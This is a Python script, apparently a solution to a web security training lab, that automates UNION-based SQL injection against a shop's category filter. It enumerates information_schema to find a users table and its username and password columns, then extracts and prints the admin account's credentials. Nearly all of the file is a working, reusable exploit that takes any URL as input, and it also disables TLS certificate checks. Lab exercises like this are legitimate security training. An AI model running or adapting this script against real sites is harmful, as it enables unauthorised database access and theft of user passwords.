# Lab: SQLi attack, listing the database contents on non-Oracle databases
import os
import re
import sys
from bs4 import BeautifulSoup
import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),

}


def find_users_table(url, path):
    sql_payload = "'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    users_table = soup.find(string=re.compile(".*users.*"))
    if users_table:
        return users_table
    else:
        return False


def find_col_names(url, category_path, users_table):
    sql_payload = f"'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+where+table_name='{users_table}'--"
    r = requests.get(url + category_path + sql_payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    username_col = soup.find(string=re.compile(".*username*."))
    password_col = soup.find(string=re.compile(".*password*."))

    return username_col, password_col


def get_username_password(url, path, username_col, password_col, users_table):
    sql_payload = f"'+UNION+SELECT+NULL,{username_col}||'~'||{password_col}+FROM+{users_table}--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    username_password = soup.find(string=re.compile(".*admin*."))

    if users_table:
        return username_password
    else:
        return False


def list_db_contents(url):
    category_path = "/filter?category=Gifts"
    # first find the users table
    users_table = find_users_table(url, category_path)
    # if found user_table get the name of columns
    if users_table:
        print("(-> Users table = " + users_table)
        print("(-> Extracting column names ")
        username_col, password_col = find_col_names(url, category_path, users_table)
        # And then find the admin password and username
        if username_col and password_col:
            print(f"(-> Found the username and password column names {username_col} , {password_col}")
            username_password = get_username_password(url, category_path, username_col, password_col, users_table)
            if username_password:
                user_passwd_list = username_password.split('~')
                print(
                    f"(-> Found the username and password of the admin account username = {user_passwd_list[0]} , password = {user_passwd_list[1]}")
            else:
                print(f"(-) Couldn't find the username and password of the admin account")
        else:
            print(f"(-) Couldn't find the username and password column names")
    else:
        print(f"(-) Couldn't find the users_table")


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]

    list_db_contents(url)


if __name__ == "__main__":
    main()




